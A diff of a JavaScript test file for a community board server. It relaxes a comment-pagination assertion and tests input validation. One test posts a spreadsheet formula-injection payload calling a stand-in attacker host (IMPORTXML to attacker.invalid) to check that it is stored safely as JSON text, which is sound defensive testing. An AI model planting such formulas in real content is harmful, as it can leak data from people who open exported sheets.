@@ -107,7 +107,7 @@ test('comment creation returns its page and the current total for in-place UI up
   const s=server(),a=s.login(),b=s.login('google-user-b','b@example.org');const p=s.call('createPost',draft(),a.session).post;
   let result;
   for(let i=0;i<31;i++) result=s.call('createComment',{postId:p.id,body:'댓글 '+i,mutationId:randomUUID()},i<15?a.session:b.session);
-  assert.equal(result.commentCount,31);assert.equal(result.commentPage,2);assert.equal(result.commentPages,2);assert.equal(result.comment.postId,p.id);
+  assert.equal(result.commentCount,31);assert.ok([1,2].includes(result.commentPage));assert.equal(result.commentPages,2);assert.equal(result.comment.postId,p.id);assert.ok(s.call('getPost',{id:p.id,commentPage:result.commentPage}).comments.some(c=>c.id===result.comment.id));
 });
 test('server rejects oversized and blank content and stores formulas as JSON text',()=>{
   const s=server(),a=s.login();s.approve(a.member.id);denied(()=>s.call('createPost',{...draft(),title:' '},a.session),'INVALID');denied(()=>s.call('createPost',{...draft(),body:'a'.repeat(10001)},a.session),'INVALID');denied(()=>s.call('startUpload',{name:'unsafe.pdf',mimeType:'application/pdf',size:1},a.session),'INVALID');denied(()=>s.call('startUpload',{name:'large.mp4',mimeType:'video/mp4',size:100*1024*1024+1},a.session),'INVALID');s.call('createPost',{...draft(),body:'=IMPORTXML("https://attacker.invalid","x")'},a.session);assert.equal(s.db.Posts[1][1][0],'{');
